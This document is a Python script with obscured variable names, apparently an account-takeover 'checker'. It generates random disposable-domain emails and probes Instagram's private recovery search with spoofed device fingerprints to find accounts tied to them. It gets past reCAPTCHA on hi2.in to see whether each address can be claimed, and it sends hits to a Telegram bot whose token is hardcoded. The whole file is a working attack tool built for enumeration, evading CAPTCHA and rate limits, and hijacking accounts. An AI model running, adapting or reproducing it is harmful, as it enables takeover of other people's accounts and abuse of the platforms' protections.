
import requests
import time
import sys
import os
import random
import secrets
import uuid
import json
import base64
import re
import queue
import threading
from threading import Thread, Lock, local
from requests.adapters import HTTPAdapter

try:
    from cfonts import render as cfont_render
    HAS_CFONTS = True
except ImportError:
    HAS_CFONTS = False
    def cfont_render(t, **k):
        return t

LAVENDER = "\033[38;5;183m"
LILAC    = "\033[38;5;189m"
PURPLE   = "\033[38;5;147m"
PINK     = "\033[38;5;213m"
BABY_PINK = "\033[38;5;219m"
BLUSH    = "\033[38;5;225m"
PEARL    = "\033[38;5;231m"
BABY_BLUE = "\033[38;5;117m"
ICE_BLUE = "\033[38;5;159m"
SKY      = "\033[38;5;153m"
MINT     = "\033[38;5;121m"
SEAFOAM  = "\033[38;5;157m"
PEACH    = "\033[38;5;216m"
GOLD     = "\033[38;5;222m"
CREAM    = "\033[38;5;230m"
RESET    = "\033[0m"

X1_A = ""       
X1_B = ""         
X2_A = "\033[2J\033[H"
X3_A = Lock()
X3_B = Lock()
X3_C = Lock()
X3_D = Lock()
X4_A = 0
X4_B = 0
X4_C = 0
X4_D = 0
X4_E = 0
X4_F = time.time()
X4_G = "—"
X4_H = 0
X4_I = 0   # <-- NEW: Taken counter
X5_A = queue.Queue()
X5_B = queue.Queue()
X6_C = "/sdcard/nottakenhi2.txt"
if os.name == 'nt':
    X6_C = os.path.join(os.path.expanduser("~"), "nottakenhi2.txt")
X7_A = 120
X7_B = 12
X7_C = 20
X8_A = LAVENDER
X8_B = MINT
X8_C = GOLD
X8_D = SKY
X8_E = PINK
X8_F = PEARL
X8_G = "\033[2m"
X8_H = RESET
X9_A = "𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙"
X9_B = "𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳"
X9_C = "𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗"
X9_D = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
X9_E = "abcdefghijklmnopqrstuvwxyz"
X9_F = "0123456789"
X9_G = {}
for _i, _c in enumerate(X9_D): X9_G[_c] = X9_A[_i]
for _i, _c in enumerate(X9_E): X9_G[_c] = X9_B[_i]
for _i, _c in enumerate(X9_F): X9_G[_c] = X9_C[_i]
def X9_H(t):
    return ''.join(X9_G.get(c, c) for c in str(t))
Y2_A = local()
Y3_A = [
    "samsung","Google","Xiaomi","OnePlus","Nothing","HUAWEI","OPPO","vivo",
    "realme","motorola","Sony","Nokia","LG","HTC","ASUS","ZTE","Lenovo",
    "TCL","Honor","Infinix","Tecno","itel","POCO","Redmi","Meizu",
    "Alcatel","Sharp","Panasonic","Micromax","Lava","Karbonn","Wiko",
    "Fairphone","CAT","Doogee","Ulefone","Umidigi","Blackview","Oukitel",
    "Cubot","Elephone","Coolpad","Gionee","Vsmart","Archos","Essential",
    "Razer","Vertu","Turing","Punkt","Crosscall","AGM","Apple"
]
Y3_B = [
    "SM-G973F","Pixel 7","M2102J20SG","ONEPLUS A6003","A063",
    "SM-G991B","SM-G996B","SM-G998B","SM-S901B","SM-S906B","SM-S908B",
    "SM-A525F","SM-A725F","SM-A336B","SM-A536B","SM-A736B",
    "SM-N986B","SM-N981B","SM-F926B","SM-F711B",
    "Pixel 4","Pixel 4a","Pixel 5","Pixel 5a","Pixel 6","Pixel 6a",
    "Pixel 6 Pro","Pixel 7a","Pixel 7 Pro","Pixel 8","Pixel 8 Pro","Pixel 8a",
    "Nexus 5","Nexus 6","Nexus 5X","Nexus 6P",
    "M2101K7AG","M2101K6G","M2103K19G","2201117TY","2201123G",
    "Redmi Note 10","Redmi Note 11","Redmi Note 12","Redmi 9","Redmi 10",
    "POCO X3","POCO X4","POCO F3","POCO F4","POCO M3","POCO M4",
    "Mi 10","Mi 11","Mi 12","Mi 13","Mi Mix 4",
    "ONEPLUS A5000","ONEPLUS A5010","ONEPLUS A6000","ONEPLUS A6010",
    "IN2023","IN2025","LE2101","LE2121","CPH2451","CPH2449",
    "M2007J3SY","M2007J3SG","M2012K11AG","M2102K1AC",
    "V2027","V2045","V2109","V2130","V2145","V2204","V2230",
    "RMX2001","RMX1921","RMX1971","RMX1992","RMX2002","RMX2061",
    "CPH2001","CPH2015","CPH2083","CPH2173","CPH2185",
    "moto g(30)","moto g(50)","moto g(60)","moto g power","moto edge 20",
    "XQ-AT51","XQ-AT52","XQ-BC72","XQ-CT54","XQ-DQ54",
    "Nokia 7.2","Nokia 8.3","Nokia G20","Nokia X20","Nokia 5.4",
    "LM-G900","LM-V600","LM-G910",
    "HTC U11","HTC U12+","HTC Desire 20+",
    "ASUS_I001DA","ASUS_I002D","ASUS_I005DA","ASUS_I006D",
    "ZTE A2020","ZTE Blade 20","ZTE Axon 30",
    "Lenovo K14","Lenovo Z6","Lenovo Tab P11",
    "TCL 20","TCL 20 Pro","TCL 30",
    "ANY-LX1","ANY-LX2","ANY-LX3","BVL-N49","BVL-NX1",
    "Infinix X6815","Infinix X6817","Infinix X688","Infinix X690",
    "TECNO KE5","TECNO KI5","TECNO KG5","TECNO KD7",
    "itel A661L","itel L6006","itel P661L",
    "iPhone 6","iPhone 6 Plus","iPhone 6s","iPhone 6s Plus",
    "iPhone 7","iPhone 7 Plus","iPhone 8","iPhone 8 Plus",
    "iPhone X","iPhone XR","iPhone XS","iPhone XS Max",
    "iPhone 11","iPhone 11 Pro","iPhone 11 Pro Max",
    "iPhone 12","iPhone 12 mini","iPhone 12 Pro","iPhone 12 Pro Max",
    "iPhone 13","iPhone 13 mini","iPhone 13 Pro","iPhone 13 Pro Max",
    "iPhone 14","iPhone 14 Plus","iPhone 14 Pro","iPhone 14 Pro Max",
    "iPhone 15","iPhone 15 Plus","iPhone 15 Pro","iPhone 15 Pro Max",
    "iPad 9","iPad 10","iPad Air 4","iPad Air 5","iPad Pro 11","iPad Pro 12.9",
    "Galaxy Tab S7","Galaxy Tab S8","Galaxy Tab S9","Galaxy Tab A8",
    "Xiaomi Pad 5","Xiaomi Pad 6","Lenovo Tab M10","Lenovo Tab P12"
]
Y3_C = ["160","240","280","320","360","400","420","440","450","480","520","560","640"]
Y3_D = [
    "480x800","540x960","720x1280","720x1440","720x1520","720x1600",
    "750x1334","828x1792","1080x1920","1080x2160","1080x2280","1080x2340",
    "1080x2400","1080x2520","1125x2436","1170x2532","1179x2556",
    "1242x2208","1242x2688","1284x2778","1290x2796","1440x2560",
    "1440x2960","1440x3040","1440x3088","1440x3200","1600x2560",
    "1644x2360","1668x2224","1668x2388","2048x1536","2048x2732",
    "2560x1600","2732x2048"
]
Y3_E = ["8","9","10","11","12","13","14","15"]
Y3_F = [180,190,200,210,220,230,240,250,260,270,280,290,300,310,320,330,340,350]
Y3_G = [0,60,120,180,240,300,330,360,420,480,540,570,600,660,720]
Y4_A = "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
Y4_B = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
Y4_C = ('"user_id"','"pk"','"username"','"full_name"',
        '"profile_pic_url"','"is_private"','"is_verified"',
        '"follower_count"','"account_type"')
Y4_D = re.compile(r'"follower_count"\s*:\s*"?(\d+)"?')
Y4_E = json.dumps({"bloks_version": Y4_A, "styles_id": "instagram"})
Y4_F = '567067343352427'
Y4_G = 'IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/'
Y4_H = 'en_IN'
Y4_I = 'en-IN, en-US'
Y4_J = 'caa_iteration_v3_perf_ig_4'
Y4_K = 'pre_mt_behavior'
Y4_L = 'login_home'
Y4_M = 'logged_out'
Y4_N = 'email_or_username'
Y4_O = 'release'
Y4_P = 36707139
Y5_A = "6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct"
Y5_B = "aHR0cHM6Ly9oaTIuaW46NDQz"
Y5_C = "XrIDux0s7SoNe6_IHkjGC92W"
Y5_D = "https://www.google.com/recaptcha/api2/anchor?ar=1"
Y5_E = "https://www.google.com/recaptcha/enterprise/anchor?"
Y5_F = "https://www.google.com/recaptcha/enterprise/reload"
Y5_G = "https://hi2.in/api/custom"
Y5_H = "Mozilla/5.0"
Y5_I = "Basic bnVsbA=="
Y5_J = "application/json, text/plain, */*"
Y5_K = "already taken"
Y5_L = "recaptcha-token\" value=\""
Y5_M = "resp\",\""
Y6_A = "https://api.telegram.org/bot"
Y6_B = "/sendMessage"
Y6_C = "HTML"
Y7_A = 'abcdefghijklmnopqrstuvwxyz'
Y7_B = 6
Y7_C = 7
Y8_A = ["@hi2.in", "@telegmail.com"]
Y9_A = ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷", "⣾", "⣽"]

Y9_B = [
    LAVENDER,
    LILAC,
    PURPLE,
    SKY,
    ICE_BLUE,
    BLUSH,
    BABY_PINK,
]

Y9_C = 0
Y9_D = 0

Y9_E = PEARL
Y9_F = BLUSH

Y9_G = [
    "     ·      ",
    "    ✧ ·     ",
    "   · ✦ ·    ",
    "  ✧ · ✦ ·   ",
    " · ✦ ✧ ✦ · ",
    "  ✧ ✦ ✧    ",
    "   · ✧ ·    ",
    "    ✦      ",
    "     ·      ",
    "            ",
]

Y9_H = 0

Y9_I = [
    PINK,
    BABY_PINK,
    BLUSH,
    PEARL,
    BLUSH,
    BABY_PINK,
    PINK,
    LAVENDER,
]
Y11_A = {}                       
Y11_B = Lock()
Y11_C = 8                      
Y10_A = 0.5
Y10_B = 0.03
Y10_C = 25
Y10_D = 2.0
Y10_E = 0.05
Y10_F = 0.15
Y10_G = 0.01
Y10_H = 0.05
Y10_I = 60
Y10_J = 45
Y10_K = 20
def Z1_d(proxy=None):
    key = proxy or "_noproxy_"
    store = getattr(Y2_A, "sessions", None)
    if store is None:
        store = {}
        Y2_A.sessions = store
    s = store.get(key)
    if s is None:
        s = requests.Session()
        adapter = HTTPAdapter(
            pool_connections=X7_C,
            pool_maxsize=X7_C,
            max_retries=0,
            pool_block=False
        )
        s.mount("https://", adapter)
        s.mount("http://", adapter)
        s.headers.update({"Connection": "keep-alive"})
        store[key] = s
    return s
def Z2_a():
    try:
        anchor = (
            f"{Y5_D}&k={Y5_A}&co={Y5_B}"
            f"&hl=en&v={Y5_C}&size=invisible"
        )
        params = anchor.split('?')[1]
        r = requests.get(f'{Y5_E}{params}', timeout=10)
        tok = r.text.split(Y5_L)[1].split('"')[0]
        payload = (
            f"v={Y5_C}&reason=q&c={tok}"
            f"&k={Y5_A}&co={Y5_B}&hl=en&size=invisible"
        )
        hdrs = {
            "User-Agent": Y5_H,
            "Referer": f"{Y5_E}{params}",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        resp = requests.post(Y5_F, data=payload, headers=hdrs, timeout=10)
        return resp.text.split(Y5_M)[1].split('"')[0]
    except Exception:
        return None

def Z2_b(email):
    if "@" not in email:
        return None
    dom = email.split("@")[1]
    pfx = email.split("@")[0]
    solve = Z2_a()
    if not solve:
        return None
    data = {'domain': dom, 'prefix': pfx, 'recaptcha': solve}
    hdrs = {
        'User-Agent': Y5_H,
        'Accept': Y5_J,
        'authorization': Y5_I,
    }
    try:
        r = requests.post(Y5_G, data=data, headers=hdrs, timeout=15)
        res = r.json()
        if Y5_K in str(res):
            return True
        return False
    except Exception:
        return None
def Z3_a(email):
    dev = str(uuid.uuid4())
    fam = str(uuid.uuid4())
    aid = "android-" + secrets.token_hex(8)
    brd = random.choice(Y3_A)
    mdl = random.choice(Y3_B)
    dpi = random.choice(Y3_C)
    res = random.choice(Y3_D)
    av = random.choice(Y3_E)
    igv = random.choice(Y3_F)
    tz = str(random.choice(Y3_G))
    ua = f"Instagram {igv}.0.0.{random.randint(10,99)} Android ({av}; {dpi}dpi; {res}; {brd}; {mdl}; en_US)"
    inner = {
        "aac": json.dumps({
            "aac_init_timestamp": int(time.time()),
            "aacjid": str(uuid.uuid4()),
            "aaccs": secrets.token_urlsafe(32)
        }),
        "flash_call_permissions_status": {
            "READ_PHONE_STATE": "PERMANENTLY_DENIED",
            "READ_CALL_LOG": "DENIED",
            "ANSWER_PHONE_CALLS": "DENIED"
        },
        "was_headers_prefill_available": 0,
        "network_bssid": None,
        "sfdid": "",
        "fetched_email_token_list": {},
        "search_query": email,
        "auth_secure_device_id": "",
        "ig_oauth_token": [],
        "cloud_trust_token": None,
        "was_headers_prefill_used": 0,
        "sso_accounts_auth_data": [],
        "encrypted_msisdn": "",
        "device_network_info": None,
        "text_input_id": f"akyuf0:{random.randint(50, 70)}",
        "zero_balance_state": None,
        "android_build_type": Y4_O,
        "accounts_list": [],
        "is_oauth_without_permission": 0,
        "ig_android_qe_device_id": dev,
        "gms_incoming_call_retriever_eligibility": "client_not_supported",
        "search_screen_type": Y4_N,
        "is_whatsapp_installed": 1,
        "lois_settings": {"lois_token": ""},
        "ig_vetted_device_nonce": None,
        "headers_infra_flow_id": "",
        "fetched_email_list": []
    }
    outer = {
        "event_request_id": str(uuid.uuid4()),
        "is_from_logged_out": 0,
        "layered_homepage_experiment_group": None,
        "device_id": aid,
        "login_surface": Y4_L,
        "waterfall_id": str(uuid.uuid4()),
        "INTERNAL__latency_qpl_instance_id": random.uniform(6.3e13, 6.5e13),
        "is_platform_login": 0,
        "context_data": "",
        "login_entry_point": Y4_M,
        "INTERNAL__latency_qpl_marker_id": Y4_P,
        "family_device_id": fam,
        "offline_experiment_group": Y4_J,
        "access_flow_version": Y4_K,
        "is_from_logged_in_switcher": 0,
        "qe_device_id": dev
    }

    payload = {
        'params': json.dumps({"client_input_params": inner, "server_params": outer}),
        'bk_client_context': Y4_E,
        'bloks_versioning_id': Y4_A
    }

    hdrs = {
        'User-Agent': ua,
        'accept-language': Y4_I,
        'x-bloks-version-id': Y4_A,
        'x-fb-friendly-name': Y4_G,
        'x-ig-android-id': aid,
        'x-ig-app-id': Y4_F,
        'x-ig-app-locale': Y4_H,
        'x-ig-device-id': dev,
        'x-ig-family-device-id': fam,
        'x-ig-timezone-offset': tz,
        'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
        'x-pigeon-rawclienttime': str(time.time()),
        'x-pigeon-session-id': f'UFS-{uuid.uuid4()}-0',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
    }

    try:
        r = Z1_d().post(Y4_B, data=payload, headers=hdrs, timeout=X7_B)
        code = r.status_code
        if code == 429:
            return (False, 0, 'rate')
        if code in (403, 400):
            tl = r.text.lower()
            if 'checkpoint' in tl or 'rate' in tl:
                return (False, 0, 'rate')
            return (False, 0, 'bad')
        if code != 200:
            return (False, 0, 'bad')

        text = r.text
        low = text.lower()

        if 'checkpoint_required' in low or 'please wait' in low:
            return (False, 0, 'rate')

        hp = any(k in low for k in Y4_C)
        hq = email.lower() in low
        fol = 0
        m = Y4_D.search(text)
        if m:
            try:
                fol = int(m.group(1))
            except Exception:
                fol = 0

        if hp and hq:
            return (True, fol, 'hit')
        if hq and len(text) > 2000:
            return (True, fol, 'hit')
        return (False, 0, 'bad')
    except (requests.exceptions.ConnectTimeout,
            requests.exceptions.ReadTimeout):
        return (False, 0, 'err')
    except Exception:
        return (False, 0, 'err')
def Z4_b(s):
    s = int(s)
    h, r = divmod(s, 3600)
    m, sec = divmod(r, 60)
    return f"{h:02d}:{m:02d}:{sec:02d}"

def Z4_c():
    global Y9_C, Y9_D, Y9_H
    if not X3_B.acquire(blocking=False):
        return
    try:
        with X3_A:
            h, b_, c, rl, h2, sent = X4_A, X4_B, X4_C, X4_D, X4_E, X4_H
            last = X4_G
            taken = X4_I
        up = time.time() - X4_F
        rate = c / up if up > 0 else 0
        hrate = h / up if up > 0 else 0
        with Y11_B:
            live = list(Y11_A.items())[:Y11_C]

        Y9_C = (Y9_C + 1) % len(Y9_A)
        spin = Y9_A[Y9_C]
        Y9_D = (Y9_D + 1) % len(Y9_B)
        g1 = Y9_B[Y9_D]
        g2 = Y9_B[(Y9_D + 2) % len(Y9_B)]
        g3 = Y9_B[(Y9_D + 4) % len(Y9_B)]
        Y9_H = (Y9_H + 1) % len(Y9_G)
        burst = Y9_G[Y9_H]
        bc = Y9_I[Y9_H % len(Y9_I)]
        blast = Y9_I[(Y9_H + 3) % len(Y9_I)]
        pulse = int(time.time() * 2) % 2
        pc = Y9_E if pulse == 0 else Y9_F
        live_lines = []
        if live:
            for wid, mail in live:
                live_lines.append(
                    f"{g2}    ╭─ ⟡ {X8_H}【{X9_H(str(wid).zfill(3))}】 {X8_G}ᯤ {pc}{mail[:34]}{X8_H}"
                )
        else:
            live_lines.append(
                f"{g2}    ╰─ ⟡ {X8_G}Wᴀɪᴛɪɴɢ ғᴏʀ Hits...{X8_H}"
            )
        live_block = "\n".join(live_lines)

        sys.stdout.write(X2_A)
        print(f"""{g1}
       ╭──────༺ ᯤ ✧ ᯤ ༻──────╮
       │      {PINK}✦  𝐂ʀᴜxɪғᴇʀᴡ✦{g1}      │
       ╰──────༺ ᯤ ✧ ᯤ ༻──────╯{X8_H}

{bc}    {burst}{g2} ╭─ ⋆｡°✩ {X9_H('Sᴛᴀᴛs')} ✩°｡⋆ ──────╮{X8_H}
{g2}    │  {X8_B}✧ {X9_H('Hɪᴛs')}          {X8_G}»  {pc}{X9_H(h)}{X8_H}
{g3}    │  {X8_C}◮ {X9_H('Bᴀᴅs')}          {X8_G}»  {X9_H(b_)}{X8_H}
{g2}    │  {X8_E}♡ {X9_H('Gᴏᴏᴅs Tᴏᴛᴀʟ')}  {X8_G}»  {pc}{X9_H(h2)}{X8_H}
{g3}    │  {X8_D}✦ {X9_H('Tᴀᴋᴇɴ')}         {X8_G}»  {pc}{X9_H(taken)}{X8_H}
{g2}    ╰─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─╯{X8_H}

{bc}    {burst}{g3} ╭─ ✧｡ﾟ: {X9_H('Lɪᴠᴇ Cʜᴇᴄᴋɪɴɢ')} :ﾟ｡✧ ─╮{X8_H}
{live_block}
{g3}    ╰─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─╯{X8_H}

{g1}    ╭────── ⟡ {X9_H('Lᴀsᴛ Hɪᴛ')} ⟡ ──────╮
{g1}    │  {X8_E}✦ {last}{X8_H}
{g1}    ╰────── ᯤ ────────── ᯤ ──────╯{X8_H}
""")
        sys.stdout.flush()
    finally:
        X3_B.release()
def Z5_a(email, followers):
    if not X1_A or not X1_B:
        return
    msg = f"""
   ╭── 𝐂ʀᴜxɪғᴇʀᴡ ──╮
   │  ✉  {X9_H('Eᴍᴀɪʟ')}      ⟡ {email}
   │  ♡  {X9_H('Hɪ2')}         ⟡ {X9_H('Nᴏᴛ Tᴀᴋᴇɴ')}
   ╰──  𝐂ʀᴜxɪғᴇʀᴡ ──╯
"""
    url = f"{Y6_A}{X1_A}{Y6_B}"
    payload = {'chat_id': X1_B, 'text': msg, 'parse_mode': Y6_C}
    try:
        requests.post(url, data=payload, timeout=15)
    except Exception:
        pass

def Z5_b(email, followers):
    return f"""
    ╭── 𝐂ʀᴜxɪғᴇʀᴡ ──╮
✉  {X9_H('Eᴍᴀɪʟ')}      ⟡ {email}
♡  {X9_H('Hɪ2')}         ⟡ {X9_H('Nᴏᴛ Tᴀᴋᴇɴ')}
   ╰──  𝐂ʀᴜxɪғᴇʀᴡ ──╯
"""

def Z5_c():
    batch = []
    last = time.time()
    while True:
        try:
            item = X5_A.get(timeout=Y10_A)
            batch.append(item)
        except queue.Empty:
            pass
        now = time.time()
        if batch and (len(batch) >= Y10_C or now - last > Y10_D):
            with X3_C:
                try:
                    with open(X6_C, 'a', encoding='utf-8') as f:
                        for e, fw in batch:
                            f.write(Z5_b(e, fw))
                    last = now
                except Exception:
                    pass
            batch = []

def Z5_d():
    while True:
        try:
            e, fw = X5_B.get()
        except Exception:
            continue
        Z5_a(e, fw)
        time.sleep(Y10_B)

def Z5_e():
    while True:
        time.sleep(Y10_A)
        Z4_c()
def Z6_a(dom):
    n = random.randint(Y7_B, Y7_C)
    return ''.join(random.choices(Y7_A, k=n)) + dom
def Z7_a(dom, wid):
    global X4_A, X4_B, X4_C, X4_D, X4_E, X4_G, X4_H, X4_I
    while True:
        current_dom = random.choice(Y8_A)
        email = Z6_a(current_dom)
        with Y11_B:
            Y11_A[wid] = email

        with X3_A:
            X4_C += 1
        ok, fol, st = Z3_a(email)
        if ok:
            h2s = None
            try:
                h2s = Z2_b(email)
            except Exception:
                h2s = None
            if h2s is True:
                with X3_A:
                    X4_E += 1
                    X4_I += 1   
                    X4_G = f"ᯤ  {email}  ⟡  ♡ Hɪ2 Tᴀᴋᴇɴ (Sᴛɪᴛᴄʜᴇᴅ)"
            else:
                with X3_A:
                    X4_A += 1
                    X4_H += 1
                    X4_G = f"ᯤ  {email}  ⟡  ✧ Hɪ2 Fʀᴇᴇ (Sᴇɴᴛ)"
                X5_A.put((email, fol))
                X5_B.put((email, fol))
        else:
            with X3_A:
                if st == 'rate':
                    X4_D += 1
                else:
                    X4_B += 1
            if st == 'rate':
                time.sleep(random.uniform(Y10_E, Y10_F))
            elif st == 'err':
                time.sleep(random.uniform(Y10_G, Y10_H))
def Z8_a():
    global X1_A, X1_B
    sys.stdout.write(X2_A)

    print(f"""{LAVENDER}
    ╭──────────────────────────────────────╮
    │  {PINK}✦{LAVENDER}  {X9_H(' Hɪ2 Cʜᴇᴄᴋᴇʀ')}  {PINK}✦{LAVENDER}         │
    │  {BLUSH}Developer: {PEARL}@CRUXIFERW{LAVENDER}              │
    ╰──────────────────────────────────────╯{RESET}
""")
    print(f"{LAVENDER}  ╭─ ୨୧ {X9_H('Tᴇʟᴇɢʀᴀᴍ Bᴏᴛ Tᴏᴋᴇɴ')} ✧{RESET}")
    X1_A = "8608291661:AAHFyEgT-Xxoi1GI9JZMpUYni2r62FN8LYc"

    print(f"{BABY_BLUE}  ╭─ ୨୧ {X9_H('Tᴇʟᴇɢʀᴀᴍ Cʜᴀᴛ ID')} ✧{RESET}")
    X1_B = "6592441427"

    if not X1_A or not X1_B:
        print(f"{X8_A} ⚠  {X9_H('Wᴀʀɴɪɴɢ')} ⟡ {X9_H('Nᴏ Tᴏᴋᴇɴ / Cʜᴀᴛ_ID')} {X8_H}")
        time.sleep(1)

    sys.stdout.write(X2_A)
    print(f"""{LAVENDER}
    ╭──────────────────────────────────────╮
    │  {PINK}✦{LAVENDER}  {X9_H('𝔄𝔏𝔄𝔑 Hɪ2 Cʜᴇᴄᴋᴇʀ')}  {PINK}✦{LAVENDER}         │
    │  {BLUSH}Developer: {PEARL}@CRUXIFERW{LAVENDER}              │
    ╰──────────────────────────────────────╯{RESET}
""")
    time.sleep(1.5)

    Thread(target=Z5_c, daemon=True).start()
    Thread(target=Z5_d, daemon=True).start()
    Thread(target=Z5_e, daemon=True).start()

    for i in range(X7_A):
        Thread(target=Z7_a, args=(Y8_A, i + 1), daemon=True).start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{X8_C}ᯤ {X9_H('Sᴛᴏᴘᴘᴇᴅ')} ✧{X8_H}")
if __name__ == '__main__':
    Z8_a()